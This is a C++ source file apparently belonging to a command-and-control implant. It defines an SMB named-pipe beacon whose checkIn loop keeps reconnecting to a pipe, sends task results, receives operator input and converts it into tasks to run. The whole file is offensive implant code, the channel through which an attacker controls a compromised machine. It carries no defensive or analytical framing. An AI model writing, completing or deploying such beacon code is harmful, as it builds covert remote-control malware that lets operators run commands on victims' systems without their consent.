#include "BeaconSmb.hpp"

using namespace std;
using namespace PipeHandler;


BeaconSmb::BeaconSmb(const std::string& pipeName)
	: Beacon("127.0.0.1", 911)
{
	m_clientSmb = new PipeHandler::Client(pipeName);
}


BeaconSmb::~BeaconSmb()
{
	delete m_clientSmb;
}


void BeaconSmb::checkIn()
{
	DEBUG("initConnection");
	while(!m_clientSmb->initConnection())
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(333));	
		DEBUG("initConnection");
	}

	std::string output;
	taskResultsToCmd(output);

	DEBUG("sending output.size " << std::to_string(output.size()));

	bool res = m_clientSmb->sendData(output);
	if(res)
	{
		string input;
		while(input.empty())
		{
			res=m_clientSmb->receiveData(input);
			std::this_thread::sleep_for(std::chrono::milliseconds(50));		
		}
		if(res)
		{
			DEBUG("received input.size " << std::to_string(input.size()));

			if(!input.empty())
			{
				cmdToTasks(input);
			}
		}
		else
		{
			DEBUG("Receive failed");
		}
	}
	else
		DEBUG("Send failed");	


	m_clientSmb->closeConnection();
}

